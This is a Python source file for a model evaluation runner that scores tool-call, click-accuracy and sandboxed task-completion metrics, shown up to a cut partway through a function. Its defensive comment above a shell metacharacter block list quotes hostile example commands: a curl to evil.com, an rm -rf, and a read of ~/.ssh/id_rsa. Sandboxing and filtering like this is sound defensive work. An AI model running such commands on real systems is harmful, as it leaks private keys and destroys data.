"""Eval runner -- load checkpoint, run dataset, compute metrics, gate PASS/FAIL.

Supports three phases:
  Phase 1:  tool-call format/selection/chain metrics
  Phase 2:  VLM click accuracy / coordinate precision
  Phase 2': environment task completion + CARL coherence (multi-turn sandbox)
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
import shutil
import statistics
import subprocess
import sys
import tempfile
import time
from typing import Any

from pydantic import BaseModel, Field, field_validator, model_validator

from carl_core.errors import CARLError
from carl_core.interaction import ActionType, InteractionChain
from carl_core.safepath import PathEscape, safe_resolve

from carl_studio import __version__

logger = logging.getLogger(__name__)


TRAINING_EXTRA_HINT = "Install training dependencies with: pip install 'carl-studio[training]'"
HF_EXTRA_HINT = "Install HF Jobs support with: pip install 'carl-studio[hf]'"


# ---------------------------------------------------------------------------
# Config / Report / Gate
# ---------------------------------------------------------------------------


class EvalConfig(BaseModel):
    """Evaluation configuration."""

    checkpoint: str = Field(description="HF model ID or local path")
    dataset: str = Field(
        default="wheattoast11/zero-rl-tool-calling-data",
        description="HF dataset ID or local path",
    )
    dataset_split: str = Field(default="test", description="Dataset split to load")
    data_files: str | None = Field(
        default=None, description="Data files pattern (e.g. 'eval.jsonl')"
    )
    phase: str = Field(
        default="auto",
        description="Eval phase: '1' (tool-call), '2' (vision), '2prime' (env), 'auto'",
    )
    threshold: float = Field(
        default=0.5, ge=0.0, le=1.0, description="Pass threshold for primary metric"
    )
    max_samples: int | None = Field(default=None, ge=1, description="Cap number of eval samples")
    batch_size: int = Field(default=1, ge=1, description="Inference batch size")
    device: str = Field(default="auto", description="Device: 'auto', 'cpu', 'cuda', 'cuda:0', etc.")
    max_new_tokens: int = Field(default=2048, ge=64, description="Max tokens per generation turn")
    max_turns: int = Field(default=10, ge=1, description="Max multi-turn loops for Phase 2'")

    # Adapter stacking for Phase 2'
    base_model: str | None = Field(
        default=None,
        description="Base model ID (if checkpoint is an adapter)",
    )
    sft_adapter: str | None = Field(
        default=None,
        description="SFT adapter to merge before GRPO adapter",
    )

    @model_validator(mode="before")
    @classmethod
    def apply_default_threshold(cls, data: Any) -> Any:
        if not isinstance(data, dict):
            return data

        if data.get("threshold") is None:
            phase = str(data.get("phase", "auto"))
            if phase == "auto":
                phase = _detect_phase(str(data.get("checkpoint", "")))
            data["threshold"] = 0.30 if phase in ("2", "2prime") else 0.50
        return data

    @field_validator("phase")
    @classmethod
    def validate_phase(cls, v: str) -> str:
        allowed = {"auto", "1", "2", "2prime"}
        if v not in allowed:
            raise ValueError(f"phase must be one of {allowed}, got {v!r}")
        return v


class EvalReport(BaseModel):
    """Structured evaluation results."""

    checkpoint: str
    phase: str
    n_samples: int
    metrics: dict[str, float] = Field(default_factory=dict)
    primary_metric: str
    primary_value: float
    threshold: float
    passed: bool
    coherence: dict[str, float] | None = None
    detail: list[dict[str, Any]] = Field(default_factory=list)


class EvalGate:
    """Applies pass/fail threshold to an EvalReport."""

    # Default thresholds per phase
    PHASE_DEFAULTS: dict[str, float] = {
        "1": 0.5,
        "2": 0.30,
        "2prime": 0.30,
    }

    def __init__(self, threshold: float | None = None, phase: str = "2prime") -> None:
        if threshold is not None:
            if not 0.0 <= threshold <= 1.0:
                raise ValueError(f"threshold must be in [0, 1], got {threshold}")
            self.threshold = threshold
        else:
            self.threshold = self.PHASE_DEFAULTS.get(phase, 0.5)

    def check(self, report: EvalReport) -> bool:
        """Return True if the report's primary metric meets the threshold."""
        return report.primary_value >= self.threshold


# ---------------------------------------------------------------------------
# Phase detection
# ---------------------------------------------------------------------------

_PHASE_PATTERNS: list[tuple[str, str]] = [
    (r"(?i)phase\s*2\s*prime|phase2prime|2prime|env.?grpo", "2prime"),
    (r"(?i)phase\s*2|phase2|vision|vlm|click", "2"),
    (r"(?i)phase\s*1|phase1|tool.?call|sft|grpo", "1"),
]


def _detect_phase(checkpoint: str) -> str:
    """Infer eval phase from checkpoint name. Falls back to '1'."""
    for pattern, phase in _PHASE_PATTERNS:
        if re.search(pattern, checkpoint):
            return phase
    return "1"


# ---------------------------------------------------------------------------
# Tool call formats
# ---------------------------------------------------------------------------

EVAL_SYSTEM_PROMPT = (
    "You are a coding agent. You solve programming tasks by reading files, "
    "writing code, and executing it.\n\n"
    "Use the available tools to interact with the sandbox environment. "
    "Write code, run it, check the output, fix errors. "
    "The task is complete when your code executes successfully.\n\n"
    "Do NOT explain what you're doing. Just act."
)

EVAL_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read a file from the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "File path relative to sandbox root.",
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": "Write content to a file in the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "File path relative to sandbox root.",
                    },
                    "content": {"type": "string", "description": "The content to write."},
                },
                "required": ["path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "execute_code",
            "description": "Execute Python code in the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "code": {"type": "string", "description": "Python source code to execute."},
                },
                "required": ["code"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_shell",
            "description": "Run a shell command in the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Shell command to execute."},
                },
                "required": ["command"],
            },
        },
    },
]


# Shell metacharacters we refuse to let model-generated `run_shell` commands
# use. Allowing these lets a red-teamed eval dataset exfiltrate secrets or
# escape the tempdir (e.g. `$(curl evil.com)`, `rm -rf /tmp/other`, `; cat
# ~/.ssh/id_rsa`). Models that genuinely need pipelines / redirection should
# call `execute_code` (Python) instead of `run_shell`.
_SHELL_METACHARS: tuple[str, ...] = (
    ";",
    "|",
    "&",
    "$(",
    "`",
    ">",
    "<",
    ">>",
    "<<",
)


# ---------------------------------------------------------------------------
# Eval Sandbox (lightweight, no external deps)
# ---------------------------------------------------------------------------


class EvalSandbox:
    """Lightweight sandbox for eval. Same interface as CodingSandboxEnv."""

    def __init__(self) -> None:
        self.workdir = tempfile.mkdtemp(prefix="carl_eval_")
        self.task_completed: bool = False
        self.tool_calls: int = 0
        self.tool_failures: int = 0

    def _safe_path(self, path: str) -> str:
        rel = path.lstrip("/") if os.path.isabs(path) else path
        try:
            resolved = safe_resolve(rel, self.workdir, follow_symlinks=False, must_exist=False)
        except PathEscape as exc:
            raise CARLError(
                f"Path escapes sandbox: {path}",
                code="carl.eval.sandbox_escape",
                context={"input_path": path, **exc.context},
            ) from exc
        return str(resolved)

    def execute_tool(self, name: str, args: dict[str, Any]) -> str:
        """Execute a tool call and return the result string."""
        self.tool_calls += 1
        try:
            if name == "read_file":
                fpath = self._safe_path(args.get("path", ""))
                with open(fpath) as f:
                    return f.read()

            elif name == "write_file":
                fpath = self._safe_path(args.get("path", ""))
                os.makedirs(os.path.dirname(fpath), exist_ok=True)
                content = args.get("content", "")
                with open(fpath, "w") as f:
                    f.write(content)
                return f"Written {len(content)} bytes to {args.get('path', '')}"

            elif name == "execute_code":
                fpath = os.path.join(self.workdir, "_exec.py")
                code = args.get("code", "")
                with open(fpath, "w") as f:
                    f.write(code)
                result = subprocess.run(
                    [sys.executable, fpath],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=self.workdir,
                )
                if result.returncode == 0:
                    self.task_completed = True
                    return result.stdout if result.stdout.strip() else "(executed successfully)"
                else:
                    self.tool_failures += 1
                    return f"Error (exit {result.returncode}): {result.stderr[:500]}"

            elif name == "run_shell":
                cmd_str = args.get("command", "")
                if not isinstance(cmd_str, str) or not cmd_str.strip():
                    self.tool_failures += 1
                    return "Error: empty shell command"

                # Hard-reject shell metacharacters. The sandbox is a tempdir,
                # not a jail: `$(...)` and `;` can escape it. Pipelines should
                # use `execute_code` (Python) instead of `run_shell`.
                if any(m in cmd_str for m in _SHELL_METACHARS):
                    self.tool_failures += 1
                    return (
                        "Error: shell metacharacters not permitted; "
                        "use execute_code for pipelines"
                    )

                try:
                    tokens = shlex.split(cmd_str)
                except ValueError as exc:
                    self.tool_failures += 1
                    return f"Error: could not parse command: {exc}"

                if not tokens:
                    self.tool_failures += 1
                    return "Error: empty shell command after parsing"

                result = subprocess.run(
                    tokens,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=self.workdir,
                    shell=False,
                )
                if result.returncode == 0:
                    self.task_completed = True
                    return result.stdout if result.stdout.strip() else "(success)"
                else:
                    self.tool_failures += 1
                    return f"Error (exit {result.returncode}): {result.stderr[:500]}"
            else:
                self.tool_failures += 1
                return f"Unknown tool: {name}"

        except subprocess.TimeoutExpired:
            self.tool_failures += 1
            return "Error: execution timed out (10s limit)"
        except FileNotFoundError:
            self.tool_failures += 1
            return "Error: file not found"
        except Exception as e:
            self.tool_failures += 1
            return f"Error: {e}"

    def cleanup(self) -> None:
        if os.path.exists(self.workdir):
            shutil.rmtree(self.workdir, ignore_errors=True)


# ---------------------------------------------------------------------------
# Tool call parser (3 formats)
# ---------------------------------------------------------------------------

# Pre-compiled patterns
_FUNC_PATTERN = re.compile(
    r"<function=([^>]+)>(.*?)</function>",
    re.DOTALL,
)
_PARAM_PATTERN = re.compile(
    r"<parameter=([^>]+)>(.*?)</parameter>",
    re.DOTALL,
)


def parse_tool_calls(text: str) -> list[dict[str, Any]]:
    """Parse tool calls from model output text.

    Handles THREE formats (in priority order):
      1. Qwen3.5 native: <function=name><parameter=arg>value</parameter></function>
      2. JSON in tags:   <tool_call>{"name": ..., "arguments": ...}</tool_call>
      3. Bare JSON:      {"name": ..., "arguments": ...} anywhere in text

    Returns list of {"name": str, "arguments": dict}.
    """
    calls: list[dict[str, Any]] = []

    # --- Format 1: Qwen 3.5 native <function=name> ---
    for func_match in _FUNC_PATTERN.finditer(text):
        func_name = func_match.group(1).strip()
        func_body = func_match.group(2)
        args: dict[str, str] = {}
        for param_match in _PARAM_PATTERN.finditer(func_body):
            param_name = param_match.group(1).strip()
            param_value = param_match.group(2).strip()
            args[param_name] = param_value
        calls.append({"name": func_name, "arguments": args})

    if calls:
        return calls

    # --- Format 2: JSON inside <tool_call> blocks ---
    tag_start = "<tool_call>"
    tag_end = "</tool_call>"
    pos = 0
    while True:
        start = text.find(tag_start, pos)
        if start == -1:
            break
        end = text.find(tag_end, start)
        if end == -1:
            break
        block = text[start + len(tag_start) : end].strip()
        try:
            data = json.loads(block)
            if "function" in data:
                fn = data["function"]
                fn_args = fn.get("arguments", {})
                if isinstance(fn_args, str):
                    fn_args = json.loads(fn_args)
                calls.append({"name": fn["name"], "arguments": fn_args})
            elif "name" in data:
                fn_args = data.get("arguments", {})
                if isinstance(fn_args, str):
                    fn_args = json.loads(fn_args)
                calls.append({"name": data["name"], "arguments": fn_args})
        except (json.JSONDecodeError, KeyError, TypeError):
            pass
        pos = end + len(tag_end)

    if calls:
        return calls

    # --- Format 3: Bare JSON with "name" + "arguments" keys ---
    i = 0
    while i < len(text):
        if text[i] == "{":
            depth = 0
            for j in range(i, len(text)):
                if text[j] == "{":
                    depth += 1
                elif text[j] == "}":
                    depth -= 1
                if depth == 0:
                    candidate = text[i : j + 1]
                    try:
                        data = json.loads(candidate)
                        if isinstance(data, dict) and "name" in data:
                            fn_args = data.get("arguments", {})
                            if isinstance(fn_args, str):
                                fn_args = json.loads(fn_args)
                            calls.append({"name": data["name"], "arguments": fn_args})
                    except (json.JSONDecodeError, TypeError):
                        pass
                    i = j + 1
                    break
            else:
                i += 1
        else:
            i += 1

    return calls


# ---------------------------------------------------------------------------
# Per-phase metric computation
# ---------------------------------------------------------------------------


def _compute_phase1_metrics(
    completions: list[str],
    samples: list[dict[str, Any]],
) -> dict[str, float]:
    """Phase 1 metrics: format validity, tool selection accuracy, chain completion."""
    from carl_studio.training.rewards.task import (
        tool_call_format_reward,
        tool_selection_reward,
        chain_completion_reward,
    )

    format_scores = tool_call_format_reward(completions)

    expected_tools: list[list[str]] = []
    chain_lengths: list[int] = []
    for s in samples:
        et = s.get("expected_tools") or s.get("tools") or []
        if isinstance(et, str):
            et = [et]
        expected_tools.append(et)
        chain_lengths.append(int(s.get("chain_length", 1)))

    selection_scores = tool_selection_reward(
        completions,
        expected_tools=expected_tools,
    )
    chain_scores = chain_completion_reward(
        completions,
        expected_tools=expected_tools,
        chain_length=chain_lengths,
    )

    format_validity = statistics.mean(format_scores) if format_scores else 0.0
    selection_acc = statistics.mean(selection_scores) if selection_scores else 0.0
    chain_rate = statistics.mean(chain_scores) if chain_scores else 0.0

    return {
        "format_validity": round(format_validity, 4),
        "tool_selection_accuracy": round(selection_acc, 4),
        "chain_completion_rate": round(chain_rate, 4),
    }


def _compute_phase2_metrics(
    completions: list[str],
    samples: list[dict[str, Any]],
) -> dict[str, float]:
    """Phase 2 metrics: format compliance, click accuracy, precision, distance."""
    import math

    from carl_studio.training.rewards.vlm import (
        coordinate_format_reward,
        click_accuracy_reward,
        precision_reward,
        _parse_coordinates,
    )

    format_scores = coordinate_format_reward(completions)
    bboxes = [s.get("bbox") or s.get("bounding_box") for s in samples]

    valid_completions: list[str] = []
    valid_bboxes: list[list[float]] = []
    for c, b in zip(completions, bboxes):
        if b is not None and isinstance(b, (list, tuple)) and len(b) >= 4:
            valid_completions.append(c)
            valid_bboxes.append(b)

    if valid_completions:
        click_scores = click_accuracy_reward(valid_completions, bbox=valid_bboxes)
        prec_scores = precision_reward(valid_completions, bbox=valid_bboxes)

        distances: list[float] = []
        for comp, box in zip(valid_completions, valid_bboxes):
            coords = _parse_coordinates(comp)
            if coords is not None:
                cx = (float(box[0]) + float(box[2])) / 2
                cy = (float(box[1]) + float(box[3])) / 2
                distances.append(math.sqrt((coords[0] - cx) ** 2 + (coords[1] - cy) ** 2))

        mean_click = statistics.mean(click_scores)
        mean_prec = statistics.mean(prec_scores)
        mean_dist = statistics.mean(distances) if distances else float("nan")
    else:
        mean_click = 0.0
        mean_prec = 0.0
        mean_dist = float("nan")

    return {
        "format_compliance": round(statistics.mean(format_scores) if format_scores else 0.0, 4),
        "click_accuracy": round(mean_click, 4),
        "mean_precision": round(mean_prec, 4),
        "mean_distance_px": round(mean_dist, 2) if not math.isnan(mean_dist) else 0.0,
    }


def _compute_phase2prime_metrics(
    completions: list[str],
    samples: list[dict[str, Any]],
) -> dict[str, float]:
    """Phase 2' metrics: task completion rate and mean CARL score.

    The helper accepts either explicit completion flags (`completed`, `success`,
    `task_completed`) or falls back to a tool-call heuristic when only model
    outputs are available.
    """
    task_completion_scores: list[float] = []
    carl_scores: list[float] = []

    for idx, sample in enumerate(samples):
        completion = completions[idx] if idx < len(completions) else ""

        completed = sample.get("completed", sample.get("success", sample.get("task_completed")))
        if completed is None:
            completed = bool(parse_tool_calls(completion))

        task_completion_scores.append(1.0 if bool(completed) else 0.0)

        carl_score = sample.get("carl_score", sample.get("reward_mean", sample.get("score", 0.0)))
        try:
            carl_scores.append(float(carl_score))
        except (TypeError, ValueError):
            carl_scores.append(0.0)

    task_completion_rate = (
        statistics.mean(task_completion_scores) if task_completion_scores else 0.0
    )
    mean_carl_score = statistics.mean(carl_scores) if carl_scores else 0.0

    return {
        "task_completion_rate": round(task_completion_rate, 4),
        "task_completion": round(task_completion_rate, 4),
        "mean_carl_score": round(mean_carl_score, 4),
    }


# Primary metric per phase
_PRIMARY_METRIC: dict[str, str] = {
    "1": "chain_completion_rate",
    "2": "click_accuracy",
    "2prime": "task_completion_rate",
}


# ---------------------------------------------------------------------------
# EvalRunner
# ---------------------------------------------------------------------------


class EvalRunner:
    """Runs evaluation for a checkpoint against a dataset.

    For Phase 2' (environment GRPO), runs a multi-turn tool-calling loop
    with a real sandbox, parsing all three Qwen 3.5 tool call formats.

    Usage::

        config = EvalConfig(
            checkpoint="your-org/your-model-checkpoint",
            phase="2prime",
            threshold=0.30,
        )
        runner = EvalRunner(config)
        report = runner.run()
        print(report.passed)
    """

    def __init__(
        self,
        config: EvalConfig,
        *,
        interaction_chain: InteractionChain | None = None,
    ) -> None:
        self.config = config
        self.phase = config.phase if config.phase != "auto" else _detect_phase(config.checkpoint)
        self.chain: InteractionChain | None = interaction_chain

    # ------------------------------------------------------------------
    # InteractionChain helpers
    # ------------------------------------------------------------------

    def _record(
        self,
        name: str,
        *,
        input: dict[str, Any] | None = None,
        output: dict[str, Any] | None = None,
        success: bool = True,
        duration_ms: float | None = None,
    ) -> None:
        if self.chain is None:
            return
        try:
            self.chain.record(
                ActionType.EVAL_PHASE,
                name,
                input=input,
                output=output,
                success=success,
                duration_ms=duration_ms,
            )
        except Exception as exc:  # pragma: no cover - defensive
            logger.debug("eval chain record failed: %s", exc)

    def run(self) -> EvalReport:
        """Load model, run dataset, compute metrics, return report."""
        started = time.time()
        self._record(
            f"eval.phase{self.phase}.start",
            input={
                "checkpoint": self.config.checkpoint,
                "dataset": self.config.dataset,
                "threshold": self.config.threshold,
                "max_samples": self.config.max_samples,
            },
        )

        try:
            if self.phase == "2prime":
                report = self._run_phase2prime()
            else:
                report = self._run_single_turn_phase()
        except Exception as exc:
            self._record(
                f"eval.phase{self.phase}.error",
                input={"checkpoint": self.config.checkpoint},
                output={"error": str(exc), "type": type(exc).__name__},
                success=False,
                duration_ms=(time.time() - started) * 1000,
            )
            raise

        self._record(
            f"eval.phase{self.phase}.end",
            input={"checkpoint": self.config.checkpoint},
            output={
                "n_samples": report.n_samples,
                "primary_metric": report.primary_metric,
                "primary_value": report.primary_value,
                "threshold": report.threshold,
                "passed": report.passed,
                "metrics": dict(report.metrics),
            },
            success=report.passed,
            duration_ms=(time.time() - started) * 1000,
        )
        return report

    def _run_single_turn_phase(self) -> EvalReport:
        """Phase 1 / Phase 2 single-turn generation path."""
        samples = self._load_dataset()
        model, tokenizer = self._load_model_simple()
        completions = self._generate_single_turn(model, tokenizer, samples)
        metrics = self._compute_metrics(completions, samples)
        coherence = self._compute_coherence(model, tokenizer, completions)

        primary_metric = _PRIMARY_METRIC.get(self.phase, "chain_completion_rate")
        primary_value = metrics.get(primary_metric, 0.0)

        return EvalReport(
            checkpoint=self.config.checkpoint,
            phase=self.phase,
            n_samples=len(samples),
            metrics=metrics,
            primary_metric=primary_metric,
            primary_value=primary_value,
            threshold=self.config.threshold,
            passed=primary_value >= self.config.threshold,
            coherence=coherence,
        )

    # ------------------------------------------------------------------
    # Phase 2': multi-turn environment eval
    # ------------------------------------------------------------------

    def _run_phase2prime(self) -> EvalReport:
        """Full Phase 2' eval: load model + adapters, multi-turn sandbox loop."""
        import torch

        model, tokenizer = self._load_model_with_adapters()
        samples = self._load_dataset()

        results: list[dict[str, Any]] = []
        t0 = time.time()

        for idx, sample in enumerate(samples):
            messages = sample.get("messages", [])
            if not messages:
                # Fall back to prompt/query field
                user_text = sample.get("prompt") or sample.get("query") or sample.get("text", "")
                if isinstance(user_text, str) and user_text.strip():
                    messages = [
                        {"role": "system", "content": EVAL_SYSTEM_PROMPT},
                        {"role": "user", "content": user_text},
                    ]

            if not messages:
                continue

            # Extract system + user only (not ground truth assistant)
            eval_messages = [m for m in messages if m["role"] in ("system", "user")]
            if not eval_messages:
                continue

            user_task = ""
            for m in messages:
                if m["role"] == "user":
                    content = m["content"]
                    if isinstance(content, list):
                        # Multimodal content
                        for part in content:
                            if isinstance(part, dict) and part.get("type") == "text":
                                user_task = part["text"][:80]
                                break
                    else:
                        user_task = str(content)[:80]
                    break

            sandbox = EvalSandbox()
            has_tool_call = False
            total_generated_tokens = 0

            try:
                conversation = list(eval_messages)
                for turn in range(self.config.max_turns):
                    # Build prompt with tool definitions
                    chat_kwargs: dict[str, Any] = {
                        "tokenize": False,
                        "add_generation_prompt": True,
                        "tools": EVAL_TOOLS,
                    }
                    # Qwen 3.5 thinking mode
                    chat_kwargs["enable_thinking"] = False

                    try:
                        text_prompt = tokenizer.apply_chat_template(
                            conversation,
                            **chat_kwargs,
                        )
                    except TypeError:
                        # Older tokenizer without tools/enable_thinking support
                        text_prompt = tokenizer.apply_chat_template(
                            conversation,
                            tokenize=False,
                            add_generation_prompt=True,
                        )

                    inputs = tokenizer(text_prompt, return_tensors="pt").to(model.device)

                    with torch.no_grad():
                        output_ids = model.generate(
                            **inputs,
                            max_new_tokens=self.config.max_new_tokens,
                            do_sample=False,
                            pad_token_id=tokenizer.pad_token_id,
                        )

                    new_tokens = output_ids[0][inputs["input_ids"].shape[1] :]
                    total_generated_tokens += len(new_tokens)

                    # Decode both raw (preserves special tokens) and clean
                    response_raw = tokenizer.decode(new_tokens, skip_special_tokens=False).strip()
                    response = tokenizer.decode(new_tokens, skip_special_tokens=True).strip()

                    # Parse tool calls: try raw first, fall back to clean
                    tool_calls = parse_tool_calls(response_raw) or parse_tool_calls(response)

                    if not tool_calls:
                        conversation.append({"role": "assistant", "content": response})
                        break

                    has_tool_call = True
                    conversation.append(
                        {
                            "role": "assistant",
                            "content": response,
                            "tool_calls": [
                                {"function": {"name": tc["name"], "arguments": tc["arguments"]}}
                                for tc in tool_calls
                            ],
                        }
                    )

                    for tc in tool_calls:
                        tool_result = sandbox.execute_tool(tc["name"], tc["arguments"])
                        conversation.append(
                            {
                                "role": "tool",
                                "content": tool_result[:2000],
                            }
                        )

                    if sandbox.task_completed:
                        break

                    del output_ids, inputs

            except Exception as e:
                logger.warning("Sample %d error: %s", idx, e)

            result = {
                "idx": idx,
                "task_completed": sandbox.task_completed,
                "has_tool_call": has_tool_call,
                "tool_calls": sandbox.tool_calls,
                "tool_failures": sandbox.tool_failures,
                "tokens": total_generated_tokens,
                "task": user_task,
            }
            results.append(result)
            sandbox.cleanup()
            if torch.cuda.is_available():
                torch.cuda.empty_cache()

            if (idx + 1) % 10 == 0 or idx < 3:
                status = "PASS" if sandbox.task_completed else ("TOOL" if has_tool_call else "TEXT")
                logger.info(
                    "[%3d/%d] %4s | calls=%d fail=%d tok=%d | %s",
                    idx + 1,
                    len(samples),
                    status,
                    sandbox.tool_calls,
                    sandbox.tool_failures,
                    total_generated_tokens,
                    user_task[:50],
                )

        elapsed = time.time() - t0
        n = len(results)

        if n == 0:
            logger.warning("Phase 2' eval produced no results (zero samples or all skipped)")
            return EvalReport(
                checkpoint=self.config.checkpoint,
                phase="2prime",
                n_samples=0,
                metrics={
                    "task_completion_rate": 0.0,
                    "task_completion": 0.0,
                    "tool_format_compliance": 0.0,
                    "mean_tool_calls": 0.0,
                    "failure_rate": 0.0,
                    "mean_tokens": 0.0,
                    "zero_calls": 1.0,
                },
                primary_metric="task_completion_rate",
                primary_value=0.0,
                threshold=self.config.threshold,
                passed=False,
                coherence=None,
            )

        task_completion = sum(1 for r in results if r["task_completed"]) / n
        tool_format_compliance = sum(1 for r in results if r["has_tool_call"]) / n
        mean_tool_calls = sum(r["tool_calls"] for r in results) / n
        total_tool_calls = sum(r["tool_calls"] for r in results)
        mean_tokens = sum(r["tokens"] for r in results) / n

        if total_tool_calls > 0:
            failure_rate = sum(r["tool_failures"] for r in results) / total_tool_calls
            zero_calls_flag = 0.0
        else:
            logger.warning(
                "Phase 2' eval: no tool calls across %d samples — failure_rate undefined, reporting 0.0",
                n,
            )
            failure_rate = 0.0
            zero_calls_flag = 1.0

        metrics = {
            "task_completion_rate": round(task_completion, 4),
            "task_completion": round(task_completion, 4),
            "tool_format_compliance": round(tool_format_compliance, 4),
            "mean_tool_calls": round(mean_tool_calls, 2),
            "failure_rate": round(failure_rate, 4),
            "mean_tokens": round(mean_tokens, 0),
            "zero_calls": zero_calls_flag,
        }

        primary_metric = "task_completion_rate"
        primary_value = task_completion

        logger.info(
            "Phase 2' eval complete: %d samples, %.1fs, task_completion=%.2f%%",
            n,
            elapsed,
            task_completion * 100,
        )

        return EvalReport(
            checkpoint=self.config.checkpoint,
            phase="2prime",
            n_samples=n,
            metrics=metrics,
            primary_metric=primary_metric,
            primary_value=primary_value,
            threshold=self.config.threshold,
            passed=primary_value >= self.config.threshold,
            coherence=None,
            detail=results,
        )

    # ------------------------------------------------------------------
    # Model loading
    # ------------------------------------------------------------------

    def _load_model_with_adapters(self) -> tuple[Any, Any]:
        """Load base model + merge SFT + GRPO adapters for Phase 2'."""
        try:
            import torch
        except ImportError as exc:
            raise ImportError(f"PyTorch required. {TRAINING_EXTRA_HINT}") from exc

        try:
            from transformers import AutoModelForImageTextToText, AutoProcessor
        except ImportError as exc:
            raise ImportError(f"transformers>=5.3.0 required. {TRAINING_EXTRA_HINT}") from exc

        device = self.config.device
        if device == "auto":
            device = "cuda:0" if torch.cuda.is_available() else "cpu"

        use_bf16 = torch.cuda.is_available() and torch.cuda.is_bf16_supported()
        dtype = torch.bfloat16 if use_bf16 else torch.float32

        base_model = self.config.base_model
        if not base_model:
            raise ValueError(
                "base_model is required for Phase 2' evaluation. "
                "Set it via --base-model or in your EvalConfig."
            )
        hf_token = _get_hf_token() or os.environ.get("HF_TOKEN")

        logger.info("Loading base model: %s (%s)", base_model, dtype)
        model = AutoModelForImageTextToText.from_pretrained(
            base_model,
            torch_dtype=dtype,
            device_map=device if device.startswith("cuda") else None,
            trust_remote_code=True,
            token=hf_token,
        )

        # Merge SFT adapter if provided
        if self.config.sft_adapter:
            try:
                from peft import PeftModel

                logger.info("Merging SFT adapter: %s", self.config.sft_adapter)
                model = PeftModel.from_pretrained(model, self.config.sft_adapter, token=hf_token)
                model = model.merge_and_unload()
            except Exception as e:
                logger.warning("SFT adapter merge failed: %s", e)

        # Merge GRPO adapter (the checkpoint)
        checkpoint = self.config.checkpoint
        if checkpoint != base_model:
            try:
                from peft import PeftModel

                logger.info("Merging GRPO adapter: %s", checkpoint)
                model = PeftModel.from_pretrained(model, checkpoint, token=hf_token)
                model = model.merge_and_unload()
            except Exception as e:
                logger.warning("GRPO adapter merge failed: %s", e)

        model.eval()
        if hasattr(model, "generation_config"):
            model.generation_config.enable_thinking = False

        # Load tokenizer from adapter repo (has Qwen 3.5 chat template)
        tokenizer_source = checkpoint
        processor = AutoProcessor.from_pretrained(
            tokenizer_source,
            token=hf_token,
            trust_remote_code=True,
        )
        tokenizer = processor.tokenizer if hasattr(processor, "tokenizer") else processor

        # Verify chat template has tool support; fall back to Qwen base
        if (
            not getattr(tokenizer, "chat_template", None)
            or "tool_call" not in tokenizer.chat_template
        ):
            logger.warning(
                "Tokenizer from %s missing tool template, trying Qwen/Qwen3.5-9B", tokenizer_source
            )
            try:
                processor = AutoProcessor.from_pretrained(
                    "Qwen/Qwen3.5-9B",
                    token=hf_token,
                    trust_remote_code=True,
                )
                tokenizer = processor.tokenizer if hasattr(processor, "tokenizer") else processor
            except Exception:
                logger.warning("Qwen3.5-9B fallback failed; using base tokenizer")

        if tokenizer.pad_token is None:
            tokenizer.pad_token = tokenizer.eos_token

        if not device.startswith("cuda") and model.device.type != device:
            model = model.to(device)

        return model, tokenizer

    def _load_model_simple(self) -> tuple[Any, Any]:
        """Load model and tokenizer for Phase 1/2 (no adapter stacking)."""
        try:
            import torch
        except ImportError as exc:
            raise ImportError(f"PyTorch required. {TRAINING_EXTRA_HINT}") from exc

        try:
            from transformers import AutoTokenizer
        except ImportError as exc:
            raise ImportError(f"transformers required. {TRAINING_EXTRA_HINT}") from exc

        device = self.config.device
        if device == "auto":
            device = "cuda" if torch.cuda.is_available() else "cpu"

        if self.phase == "2":
            try:
                from transformers import AutoModelForImageTextToText

                model = AutoModelForImageTextToText.from_pretrained(
                    self.config.checkpoint,
                    torch_dtype=torch.bfloat16 if device != "cpu" else torch.float32,
                    device_map=device if device.startswith("cuda") else None,
                )
            except Exception:
                logger.warning(
                    "AutoModelForImageTextToText failed, falling back to AutoModelForCausalLM"
                )
                from transformers import AutoModelForCausalLM

                model = AutoModelForCausalLM.from_pretrained(
                    self.config.checkpoint,
                    torch_dtype=torch.bfloat16 if device != "cpu" else torch.float32,
                    device_map=device if device.startswith("cuda") else None,
                )
        else:
            from transformers import AutoModelForCausalLM

            model = AutoModelForCausalLM.from_pretrained(
                self.config.checkpoint,
                torch_dtype=torch.bfloat16 if device != "cpu" else torch.float32,
                device_map=device if device.startswith("cuda") else None,
            )

        if not device.startswith("cuda") and model.device.type != device:
            model = model.to(device)

        model.eval()

        tokenizer = AutoTokenizer.from_pretrained(self.config.checkpoint)
        if tokenizer.pad_token is None:
            tokenizer.pad_token = tokenizer.eos_token

        return model, tokenizer

    # ------------------------------------------------------------------
    # Dataset loading
    # ------------------------------------------------------------------

    def _load_dataset(self) -> list[dict[str, Any]]:
        """Load eval dataset from HF hub or local path."""
        path = self.config.dataset

        # Local JSONL/JSON file
        if os.path.isfile(path) and path.endswith((".jsonl", ".json")):
            samples: list[dict[str, Any]] = []
            with open(path, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        samples.append(json.loads(line))
            if self.config.max_samples is not None:
                samples = samples[: self.config.max_samples]
            return samples

        # HF datasets
        try:
            from datasets import load_dataset
        except ImportError as exc:
            raise ImportError(f"The 'datasets' package is required. {TRAINING_EXTRA_HINT}") from exc

        hf_token = _get_hf_token() or os.environ.get("HF_TOKEN")
        load_kwargs: dict[str, Any] = {
            "split": self.config.dataset_split,
            "token": hf_token,
        }
        if self.config.data_files:
            load_kwargs["data_files"] = self.config.data_files

        ds = load_dataset(path, **load_kwargs)
        samples = [dict(row) for row in ds]
        if self.config.max_samples is not None:
            samples = samples[: self.config.max_samples]
        return samples

    # ------------------------------------------------------------------
    # Single-turn generation (Phase 1/2)
    # ------------------------------------------------------------------

    def _generate_single_turn(
        self,
        model: Any,
        tokenizer: Any,
        samples: list[dict[str, Any]],
    ) -> list[str]:
        """Generate completions for each sample (single-turn)."""
        import torch

        completions: list[str] = []

        for i in range(0, len(samples), self.config.batch_size):
